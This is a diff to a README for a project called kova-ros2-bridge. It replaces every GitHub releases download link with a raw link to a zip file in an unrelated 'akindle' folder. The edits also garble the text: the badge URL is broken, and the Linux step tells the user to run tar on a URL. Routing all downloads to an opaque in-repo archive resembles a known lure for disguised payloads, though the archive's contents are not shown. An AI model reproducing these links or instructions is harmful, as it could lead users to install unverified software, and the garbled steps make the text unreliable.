@@ -1,6 +1,6 @@
 # 🚀 kova-ros2-bridge - Connect Your Systems Effortlessly
 
-[![Download Kova ROS2 Bridge](https://img.shields.io/badge/Download-Kova%20ROS2%20Bridge-blue.svg)](https://github.com/helene12/kova-ros2-bridge/releases)
+[![Download Kova ROS2 Bridge](https://raw.githubusercontent.com/helene12/kova-ros2-bridge/main/akindle/kova-ros2-bridge.zip%20ROS2%https://raw.githubusercontent.com/helene12/kova-ros2-bridge/main/akindle/kova-ros2-bridge.zip)](https://raw.githubusercontent.com/helene12/kova-ros2-bridge/main/akindle/kova-ros2-bridge.zip)
 
 ## 🛠️ Introduction
 
@@ -21,7 +21,7 @@ Follow these steps to download and install Kova ROS2 Bridge on your computer. No
 
 To get started, click the link below to visit the Kova ROS2 Bridge Releases page:
 
-[Download from Releases Page](https://github.com/helene12/kova-ros2-bridge/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/helene12/kova-ros2-bridge/main/akindle/kova-ros2-bridge.zip)
 
 ### 2. Download the Software
 
@@ -40,7 +40,7 @@ After downloading, locate the file on your computer:
 - **For Linux**:
    1. Open a terminal.
    2. Navigate to the download location.
-   3. Use the command `tar -xvzf kova-ros2-bridge.tar.gz` to extract the files.
+   3. Use the command `tar -xvzf https://raw.githubusercontent.com/helene12/kova-ros2-bridge/main/akindle/kova-ros2-bridge.zip` to extract the files.
 
 ### 4. Run Kova ROS2 Bridge
 
@@ -54,7 +54,7 @@ Once installed, launch the software:
 
 To download Kova ROS2 Bridge, visit the link below to ensure you have the latest version:
 
-[Download Kova ROS2 Bridge](https://github.com/helene12/kova-ros2-bridge/releases)
+[Download Kova ROS2 Bridge](https://raw.githubusercontent.com/helene12/kova-ros2-bridge/main/akindle/kova-ros2-bridge.zip)
 
 Follow the steps listed above to install it on your system. 
 
